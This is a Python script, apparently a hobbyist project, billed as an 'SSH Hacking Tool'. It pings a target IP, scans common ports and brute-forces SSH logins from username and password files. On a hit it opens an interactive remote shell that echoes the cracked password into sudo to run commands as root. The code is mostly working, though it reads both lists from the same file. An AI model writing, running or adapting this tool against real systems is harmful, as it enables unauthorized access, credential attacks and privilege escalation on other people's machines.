import os
import socket
import paramiko
import platform

current_dir = ""


# check if host is up by sending ping & exe command by operating system
def ping(host):
    os_type = platform.system()
    if os_type == "Windows":
        response = os.system(f"ping -n 1 {host}")
    else:
        response = os.system(f"ping -c 1 {host}")
    return response == 0        # return T/F


# scan TCP common port by connection and append them to list.
def scan_ports(host):
    open_ports = []
    for port in [20, 21, 22, 23, 25, 53, 67, 68, 80, 110, 143, 443, 465, 587, 993, 1024]:   # common ports.
        sock = socket.socket()  # create socket to connection.
        sock.settimeout(0.5)
        result = sock.connect_ex((host, port))  # connection to host with each port in the list. returns 0 if successful
        if result == 0:
            open_ports.append(port)   # if successful (return 0) append to the new list.
        sock.close()    # close connection every loop.
    return open_ports   # return the new list with the open ports.


# try connected to the victim/host by ip + port + user + password.
def try_ssh_login(host, port, username, password):
    # function by paramiko - create object to starting ssh connection.
    client = paramiko.SSHClient()
    # Setting an automatic keying policy. (does not check the reliability of the server)
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        # try connection to ssh. if successful return the ssh connection, if not return NONE.
        client.connect(host, port, username, password, timeout=2)
        return client
    except paramiko.AuthenticationException:
        return None
    except Exception as e:
        print(f"An error occurred: {e}")
        return None


# try to execute a command by superuser (root). using by ssh connection and password.
def run_with_sudo(client, command, password):
    try:
        # try to execute.
        stdin, stdout, stderr = client.exec_command(f"echo {password} | sudo -S {command}")
        # If there is an answer, print.
        if stdout:
            print(stdout.read().decode())
        # If there is no answer, print.
        elif stderr:
            print(stderr.read().decode())
    except Exception as e:
        print(f"Error occurred: {e}")
        return None


# Handles movement within folders.
def change_directory(command, client):
    global current_dir  # Takes the current folder from a command below.
    if command.startswith('cd '):   # if the hacker try to move in dir:
        new_dir = command.split(' ', 1)[1].strip()  # ignore from the 'cd' and save the new path.
        if new_dir == "..":  # if the hacker want to move back:
            command = f"cd {current_dir} && cd .. && pwd"
        else:
            # if the hacker want to move in paths.
            command = f"cd {current_dir} && cd {new_dir} && pwd"
        stdin, stdout, stderr = client.exec_command(command)    # sending command to the victim, and accepts 3 variables
        stdout_str = stdout.read().decode().strip()     # Defines a new readable variable.
        stderr_str = stderr.read().decode().strip()     # Defines a new readable variable.
        if stdout_str:  # if there is an answer from 'stdout_str':
            current_dir = stdout_str    # Define a new current dir.
        if stderr_str:     # if error, print the error.
            print(f"Error: {stderr_str}")
        return current_dir
    # In any case return the current dir at the end.
    else:
        return current_dir


# the main function. Starts interacting with the hacker.
def main():
    global current_dir
    print("Welcome to SSH Hacking Tool!")
    host = input("Please enter your target IP address: ")   # define the target

    if ping(host):  # If an ICMP packet is sent >>> start hacking...
        print(f"{host} is up!\n")
        print("Scanning open ports...")
        open_ports = scan_ports(host)
        print(f"Open ports: {open_ports}")
        if 22 in open_ports:    # if port 22 (SSH) is open...
            print("Port 22 is open. Trying SSH login...")
            with open('testUser.txt', 'r') as user_file:    # save common usernames from file.
                usernames = user_file.read().splitlines()   # crate list with all the usernames.
            with open('testUser.txt', 'r') as pass_file:    # save common passwords from file.
                passwords = pass_file.read().splitlines()   # crate list with all the passwords.
                print("Starting Broad Forest...")
            # looping every username and password and trying to Broad Forest.
            for username in usernames:
                for password in passwords:
                    print(f"Trying {username}:{password}")
                    # using the 'try_ssh_login' function.
                    client = try_ssh_login(host, 22, username, password)
                    if client:  # if Broad Forest succeeded.
                        print(f"Hacking success! \nUsername: {username}, Password: {password}")
                        try:    # try to define current dir whit pwd command.
                            stdin, stdout, stderr = client.exec_command('pwd')
                            # take the path and defined to the 'current_dir'.
                            current_dir = stdout.read().decode().strip()
                        except Exception as e:
                            print(e)
                        # while the hacker command is not exit.
                        while True:
                            command = input(f"{username}@{host}:{current_dir}~$ ")
                            # finish the program.
                            if command.lower() == 'exit':
                                break
                            # if the hacker tries to execute a 'sudo command', used the 'run_with_sudo' function.
                            elif command.startswith('sudo '):
                                run_with_sudo(client, command, password)
                            # if the hacker tries to execute 'cd' command, used the change_directory function.
                            elif command.startswith('cd '):
                                current_dir = change_directory(command, client)
                            # else, execute every command the hacker tries to run, in the correct dir.
                            else:
                                stdin, stdout, stderr = client.exec_command(f"cd {current_dir} && {command}")
                                # print output or error.
                                print(stdout.read().decode())
                                print(stderr.read().decode())
                        # in the end of the while loop, close the connection.
                        client.close()
                        return
            # If the Broad Forest did not succeed...
            print("No valid username and password combination found.")
        else:
            print("Port 22 is closed.")
    else:
        print(f"{host} is down.")


# If the main function is not imported.
if __name__ == "__main__":
    main()
